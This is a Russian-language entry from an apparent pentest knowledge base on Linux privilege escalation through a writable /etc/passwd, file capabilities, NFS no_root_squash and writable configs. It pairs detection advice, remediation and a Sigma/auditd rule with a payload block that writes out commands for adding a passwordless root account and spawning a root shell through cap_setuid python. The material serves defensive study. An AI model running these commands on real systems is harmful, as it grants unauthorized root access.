---
id: linux-writable-passwd-and-nfs
title: "Linux: записываемые /etc/passwd, no_root_squash NFS, capabilities"
type: privesc
target: linux
category: web
difficulty: intermediate
bypass: none
tags: [privesc, linux, passwd, nfs, capabilities, misconfiguration]
tested_on: ["Debian 12", "NFS-стенд в лабораторной сети"]
success_rate: 0.55
risk: high
cwe: "CWE-732"
lab: null
last_verified: "2026-10-23"
references:
  - "https://book.hacktricks.xyz/privilege-escalation/privilege-escalation"
  - "https://man7.org/linux/man-pages/man7/capabilities.7.html"
---

# Linux: записываемые /etc/passwd, no_root_squash NFS, capabilities

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# 1) /etc/passwd доступен на запись — добавление учётки с пустым паролем
ls -la /etc/passwd /etc/shadow /etc/group
# учебный стенд: printf 'hbroot::0:0:hbroot:/root:/bin/sh\n' >> /etc/passwd && su hbroot
# (в современных системах su требует хеш; корректный вариант — сгенерировать хеш:
#  openssl passwd -6 'HB-Lab-Pass' и добавить строку с этим хешем в /etc/passwd)

# 2) capabilities, дающие эскалацию
getcap -r / 2>/dev/null | grep -vE '^/proc'
# cap_setuid+ep        -> /usr/bin/python3 -c 'import os;os.setuid(0);os.system("/bin/sh")'
# cap_setgid+ep        -> /usr/bin/python3 -c 'import os;os.setgid(0);os.system("/bin/sh")'
# cap_dac_read_search  -> чтение любых файлов (shocker/tar)
# cap_dac_override     -> запись/чтение несмотря на права
# cap_sys_ptrace       -> инъекция в процесс root
# cap_sys_module       -> загрузка модуля ядра
# cap_net_raw          -> перехват/подделка трафика (ARP-spoofing)

# 3) NFS no_root_squash: root на клиенте = root на сервере
showmount -e <nfs-server> 2>/dev/null; cat /etc/exports
# если экспорт имеет no_root_squash: смонтировать, создать SUID-бинарник
# от root на клиенте, затем запустить его на сервере (стенд!)

# 4) ядро и модули
uname -a; lsmod | head; cat /proc/version
# 5) записываемые файлы конфигурации, читаемые привилегированными службами
find /etc -writable -type f 2>/dev/null | head -20
```

## Explanation

Четыре независимых пути к root, которые часто встречаются вместе:

1. **Записываемые файлы учёток** (`/etc/passwd`, `/etc/shadow`, `/etc/group`,
    `/etc/sudoers`, `/etc/sudoers.d/*`). Исторически `passwd` хранил хеши,
    поэтому «пустой хеш» давал мгновенный вход; сейчас хеши в `shadow`,
    но запись в `passwd` всё равно позволяет создать root-учётку
    с известным хешем (`openssl passwd -6`).
2. **File capabilities**: точечные привилегии, которые дают почти то же,
    что и root, но не видны в списке SUID. Критичные: `cap_setuid`,
    `cap_setgid`, `cap_dac_override`, `cap_dac_read_search`, `cap_sys_ptrace`,
    `cap_sys_module`, `cap_sys_admin`, `cap_net_raw`, `cap_chown`.
    Их легко пропустить: `find -perm -4000` capabilities не показывает.
3. **NFS с `no_root_squash`**: root клиента сохраняет права root на
    сервере — достаточно смонтировать экспорт и создать там исполняемый
    файл. Проверять нужно и `all_squash`/`no_all_squash`, и права на
    точки монтирования.
4. **Записываемые конфигурации привилегированных служб**: `/etc/ld.so.preload`,
    `/etc/pam.d/*`, `polkit`-правила, конфиги демонов, читаемые от root.

Методика: `getcap -r /`, проверка прав на файлы в `/etc`, анализ
`/etc/exports` и выводов `showmount`, инвентаризация PAM-конфигов.

## Detection

* Baseline-проверка прав: `/etc/passwd` 0644 root:root, `/etc/shadow`
  0640 root:shadow, `/etc/sudoers` 0440.
* Инвентаризация capabilities (`getcap -r /`) и сравнение с эталоном образа.
* Аудит изменений учётных записей: события `useradd`, правки `/etc/passwd`
  (auditd на write).
* NFS: контроль `/etc/exports` на `no_root_squash`; мониторинг mount-событий
  на клиентах.
* Алерт на процесс с capabilities `setuid/setgid/sys_module`, порождённый
  непривилегированным пользователем.
* PAM: контроль целостности `/etc/pam.d` — изменения редки и критичны.

## Remediation

- Права на файлы учёток: только root; `chmod 0644 /etc/passwd`,
  `0640 /etc/shadow`, `visudo` для правок sudoers.
- Убирать ненужные capabilities: `setcap -r <file>`; в контейнерах —
  `cap_drop: [ALL]` с точечным добавлением.
- NFS: `root_squash` (по умолчанию) и `all_squash` для публичных экспортов;
  ограничивать экспорты по подсетям; не экспортировать системные каталоги.
- `noexec`, `nosuid`, `nodev` на монтируемых томах данных.
- Мониторинг целостности (`aide`/`tripwire`) для `/etc`.
- Минимизация числа привилегированных служб и их конфигов; PAM-стек
  под управлением конфигурации (IaC).


## Detection rules

```yaml
title: Использование file capabilities или запись в файлы учёток для эскалации
id: c3d4e5f6-0004-4c3d-9e4f-000000000204
status: experimental
description: >-
  Изменение /etc/passwd, /etc/shadow, /etc/sudoers непривилегированным
  процессом, либо запуск бинарника с критичными capabilities (setuid/setgid).
references:
  - https://attack.mitre.org/techniques/T1548/
  - https://man7.org/linux/man-pages/man7/capabilities.7.html
logsource:
  product: linux
  service: auditd
  definition: 'правила аудита: -w /etc/passwd -p wa; -w /etc/shadow -p wa; -w /etc/sudoers -p wa'
detection:
  account_files:
    EventType: PATH
    Name:
      - '/etc/passwd'
      - '/etc/shadow'
      - '/etc/group'
      - '/etc/sudoers'
      - '/etc/gshadow'
    auid|gte: 1000
  capabilities_exec:
    EventType: EXECVE
    Capabilities|contains:
      - 'cap_setuid'
      - 'cap_setgid'
      - 'cap_sys_module'
      - 'cap_sys_ptrace'
      - 'cap_dac_override'
  pam_tamper:
    EventType: PATH
    Name|startswith: '/etc/pam.d/'
    auid|gte: 1000
  condition: account_files or capabilities_exec or pam_tamper
fields:
  - Name
  - Image
  - CommandLine
  - User
falsepositives:
  - работа пакетного менеджера и системных утилит (useradd, passwd) — фильтруйте по Image
level: critical
tags:
  - attack.privilege_escalation
  - attack.persistence
  - attack.t1548
```
